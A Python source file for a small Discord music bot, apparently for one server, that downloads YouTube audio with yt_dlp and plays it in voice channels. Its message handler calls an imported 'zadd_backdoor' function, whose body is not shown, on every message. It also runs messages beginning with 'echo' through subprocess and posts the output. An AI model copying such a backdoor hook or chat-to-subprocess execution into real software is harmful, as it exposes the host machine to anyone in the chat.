import os
import subprocess

import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv

import zadd_handlers as zh

COMTEK_P3_GUILD_ID = 1412345322968977450

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")


@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return

    await zh.zadd_backdoor(message)
    await zh.always_respond_to(
        message, "m4rt1n1955", "Martin Martin er en uran hjort..."
    )
    await zh.always_respond_to(
        message, "alehandre", "Skibidi toilet sunset rizzler morning"
    )

    if message.content.startswith("echo"):
        print("Recieved:", message.content.split())
        await message.channel.send(
            subprocess.check_output(message.content.split()).decode("utf-8").strip()
        )
    await bot.process_commands(message)


@bot.command(name="join", help="Tells the bot to join your vc")
async def join(ctx):
    if not ctx.message.author.voice:
        await ctx.send(
            "{} is not connected to a voice channel".format(ctx.message.author.name)
        )
        return
    else:
        channel = ctx.message.author.voice.channel
        await channel.connect()


@bot.command(name="leave", help="Tells the bot to leave voice channels")
async def leave(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_connected():
        await voice_client.disconnect()
    else:
        await ctx.send("The bot is not connected to a voice channel")


@bot.command(name="play_song", help="To play song")
async def play(ctx, url):
    try:
        server = ctx.message.guild
        voice_channel = server.voice_client

        async with ctx.typing():
            filename = download_audio(url)
            voice_channel.play(
                discord.FFmpegPCMAudio(executable="ffmpeg", source=filename)
            )
        await ctx.send("**Now playing:** {}".format(filename))
    except:
        await ctx.send("The bot is not connected to a voice channel.")


@bot.command(name="pause", help="This command pauses the song")
async def pause(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        await voice_client.pause()
    else:
        await ctx.send("The bot is not playing anything at the moment.")


@bot.command(name="resume", help="Resumes the song")
async def resume(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_paused():
        await voice_client.resume()
    else:
        await ctx.send(
            "The bot was not playing anything before this. Use play_song command"
        )


@bot.command(name="stop", help="Stops the song")
async def stop(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        await voice_client.stop()
    else:
        await ctx.send("The bot is not playing anything at the moment.")


import yt_dlp


def download_audio(url: str, output_path: str = "songs/%(title)s.%(ext)s"):
    ydl_opts = {
        "format": "bestaudio/best",
        "extractaudio": True,
        "audioformat": "mp3",
        "outtmpl": output_path,  # filename template
        "noplaylist": True,  # just the single video
        "postprocessors": [
            {
                "key": "FFmpegExtractAudio",
                "preferredcodec": "mp3",
                "preferredquality": "0",  # best quality
            },
            {
                "key": "FFmpegMetadata",  # embed metadata
            },
            {
                "key": "EmbedThumbnail",  # embed thumbnail if available
            },
        ],
    }

    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(url, download=True)
        return ydl.prepare_filename(info_dict).rsplit(".", 1)[0] + ".mp3"


if __name__ == "__main__":
    load_dotenv()
    DISCORD_TOKEN = os.getenv("DISCORD_TOKEN").strip("<>")
    # client.run(DISCORD_TOKEN)
    bot.run(DISCORD_TOKEN)
